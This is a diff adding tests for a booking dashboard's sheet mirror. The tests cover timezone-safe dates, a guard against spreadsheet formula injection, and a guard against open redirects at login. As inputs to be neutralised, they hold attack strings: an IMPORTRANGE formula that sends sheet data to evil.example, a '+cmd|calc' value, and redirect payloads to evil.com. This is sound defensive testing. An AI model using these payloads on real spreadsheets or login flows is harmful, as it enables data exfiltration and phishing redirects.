@@ -10,9 +10,12 @@ import test from 'node:test';
 import assert from 'node:assert/strict';
 
 import {
-  blockEnd, expensePayload, lineKey, linePayload, planAllocation, primaryPayload,
-  priceCell, stamp,
+  blockEnd, dateOnly, desired, expensePayload, lineKey, linePayload,
+  planAllocation, primaryPayload, priceCell, stamp,
 } from './mirror.js';
+import { safeCell } from './sheets.js';
+import { calendarDate, dateInput, day } from './fmt.js';
+import { safeNext } from './nav.js';
 
 const CASH = 'كاش';
 const INSTA = 'انستاباي';
@@ -312,4 +315,171 @@ test('a rate with no effective total falls back to the number', () => {
 test('a line row has no price at all, rate or no rate', () => {
   const b = moneyRow({ nightly_rate: 500, total: 8500, effective_total: 8500 });
   assert.equal(linePayload(b, line(2, INSTA, 11, 1600), 11).total, '');
+});
+
+// ── dates: a calendar day is not an instant ─────────────────────────────────
+//
+// node-postgres parses a Postgres `date` into a JS Date at LOCAL midnight, so
+// `toISOString()` — which converts to UTC first — returns the PREVIOUS day
+// anywhere east of Greenwich. Every one of these fails under
+// `TZ=Africa/Cairo` against the old code and passes under TZ=UTC, which is
+// exactly why it survived: Vercel pins TZ=UTC and `next dev` from Egypt does
+// not. Column J is the anchor of `=TODAY()-J<row>`, so a day is a night of
+// billing.
+//
+// `supabase/mirror.py` gets this free from `datetime.date.isoformat()`; these
+// are what keep the port agreeing with it.
+//
+//     TZ=Africa/Cairo node --test webui/lib/mirror.test.mjs
+
+// What node-postgres hands over for a bare 'YYYY-MM-DD' from a date column.
+const pgDate = (y, m, d) => new Date(y, m - 1, d);
+
+test('a date column keeps its calendar day, whatever the timezone', () => {
+  assert.equal(dateOnly(pgDate(2026, 8, 15)), '2026-08-15');
+  assert.equal(dateOnly(pgDate(2026, 1, 1)), '2026-01-01');
+  assert.equal(dateOnly(pgDate(2026, 12, 31)), '2026-12-31');
+});
+
+test('the arrival written to column J is the arrival stored', () => {
+  const want = desired(moneyRow({ arrival: pgDate(2026, 8, 15) }), 10);
+  assert.equal(want.arrival, '2026-08-15');
+});
+
+test('an arrival already in text is left alone', () => {
+  assert.equal(desired(moneyRow({ arrival: '2026-08-15' }), 10).arrival, '2026-08-15');
+  assert.equal(dateOnly('2026-08-15T00:00:00.000Z'), '2026-08-15');
+});
+
+test('no arrival is an empty cell, not the epoch', () => {
+  assert.equal(desired(moneyRow({ arrival: null }), 10).arrival, '');
+  assert.equal(dateOnly(undefined), '');
+  assert.equal(dateOnly(''), '');
+});
+
+test('the UI shows and pre-fills the same day the sheet gets', () => {
+  const d = pgDate(2026, 8, 15);
+  assert.equal(day(d), '2026-08-15');
+  assert.equal(dateInput(d), '2026-08-15');
+  assert.equal(calendarDate(d), '2026-08-15');
+  // The three have to agree, or the form round-trips a different date than the
+  // page displayed and saving writes the shift back.
+  assert.equal(day(d), dateOnly(d));
+});
+
+test('a date that is not one falls back rather than inventing a day', () => {
+  assert.equal(day('غير معروف'), 'غير معروف');
+  assert.equal(dateInput('غير معروف'), '');
+  assert.equal(day(null), '—');
+});
+
+// ── formulas: two cells may be one, everything else may not ─────────────────
+//
+// USER_ENTERED is required — `=TODAY()-J<row>` and `=500*I10` have to arrive
+// as formulas — but it applies to every cell, and a guest name or a note that
+// begins with =, +, - or @ is then stored as a formula in a tab holding 1,606
+// of them. `=IMPORTRANGE(...)` in a note runs with the service account's
+// authority. `supabase/mirror.py` has the identical gap and needs the same
+// guard; these tests are the twin `supabase/test_lines.py` should grow.
+
+test('the two cells that are meant to be formulas still are', () => {
+  assert.equal(safeCell('nights_cell', '=TODAY()-J10'), '=TODAY()-J10');
+  assert.equal(safeCell('total', '=500*I10'), '=500*I10');
+  assert.equal(safeCell('total', '=(650*I19)-2200'), '=(650*I19)-2200');
+});
+
+test('a guest name cannot become a formula', () => {
+  assert.equal(safeCell('guest_name', '=1+1'), "'=1+1");
+  assert.equal(safeCell('guest_name', '@SUM(A1:A9)'), "'@SUM(A1:A9)");
+  assert.equal(safeCell('guest_name', '+cmd|calc'), "'+cmd|calc");
+});
+
+test('a note cannot exfiltrate the spreadsheet', () => {
+  const attack = '=IMPORTRANGE("https://evil.example/x","A1")';
+  assert.equal(safeCell('notes', attack), "'" + attack);
+});
+
+test('every free-text field is covered, not only the three named ones', () => {
+  for (const key of ['guest_name', 'booking_type', 'apartment_name',
+                     'room_number', 'notes', 'item', 'responsible']) {
+    assert.equal(safeCell(key, '=1+1'), "'=1+1", key);
+  }
+});
+
+test('a guest whose name starts with a dash keeps their name', () => {
+  // The reason this is not just a security fix: Sheets reads `-احمد` as a
+  // formula and leaves #NAME? in the cell.
+  assert.equal(safeCell('guest_name', '-احمد'), "'-احمد");
+});
+
+test('a negative number stays a number the sheet can sum', () => {
+  // primaryPayload subtracts the lines from the booking's paid cell and can
+  // legitimately go negative. Quoting it would break every SUM below it.
+  assert.equal(safeCell('paid', '-500'), '-500');
+  assert.equal(safeCell('amount', '-12.5'), '-12.5');
+  assert.equal(safeCell('paid', '2200'), '2200');
+});
+
+test('the text-forced three are unchanged', () => {
+  assert.equal(safeCell('phone', '01001234567'), "'01001234567");
+  assert.equal(safeCell('guest_ref', '25'), "'25");
+  assert.equal(safeCell('booking_ref', ''), '');
+});
+
+test('an empty cell stays empty', () => {
+  assert.equal(safeCell('notes', ''), '');
+  assert.equal(safeCell('notes', null), '');
+  assert.equal(safeCell('notes', undefined), '');
+});
+
+test('an ordinary value is untouched', () => {
+  assert.equal(safeCell('guest_name', 'احمد باسط'), 'احمد باسط');
+  assert.equal(safeCell('notes', 'دفع الباقي يوم الجمعة'), 'دفع الباقي يوم الجمعة');
+  assert.equal(safeCell('spent_at', '2026-08-15 12:23'), '2026-08-15 12:23');
+});
+
+test('nothing on the expenses tab is allowed to be a formula', () => {
+  const none = new Set();
+  assert.equal(safeCell('item', '=1+1', none), "'=1+1");
+  // Not even the keys the bookings tab lets through, since that tab has no
+  // formula the dashboard writes.
+  assert.equal(safeCell('total', '=1+1', none), "'=1+1");
+});
+
+// ── login: where a redirect may send someone ────────────────────────────────
+//
+// `next.startsWith('/')` was the whole check, and `//evil.com` passes it.
+
+test('an ordinary path is kept', () => {
+  assert.equal(safeNext('/bookings'), '/bookings');
+  assert.equal(safeNext('/bookings?status=owing&per=100'), '/bookings?status=owing&per=100');
+  assert.equal(safeNext('/reports#top'), '/reports#top');
+});
+
+test('a protocol-relative URL is not a path on this site', () => {
+  assert.equal(safeNext('//evil.com'), '/');
+  assert.equal(safeNext('//evil.com/login'), '/');
+  assert.equal(safeNext('///evil.com'), '/');
+});
+
+test('a backslash is folded to a slash by browsers and is refused', () => {
+  assert.equal(safeNext('/\\evil.com'), '/');
+  assert.equal(safeNext('\\\\evil.com'), '/');
+});
+
+test('whitespace hiding a second slash is refused', () => {
+  assert.equal(safeNext('/\t/evil.com'), '/');
+  assert.equal(safeNext('/\n/evil.com'), '/');
+});
+
+test('an absolute URL is refused however it is spelled', () => {
+  assert.equal(safeNext('https://evil.com'), '/');
+  assert.equal(safeNext('javascript:alert(1)'), '/');
+  assert.equal(safeNext('evil.com'), '/');
+});
+
+test('nothing at all is the root', () => {
+  assert.equal(safeNext(''), '/');
+  assert.equal(safeNext(null), '/');
+  assert.equal(safeNext(undefined), '/');
 });
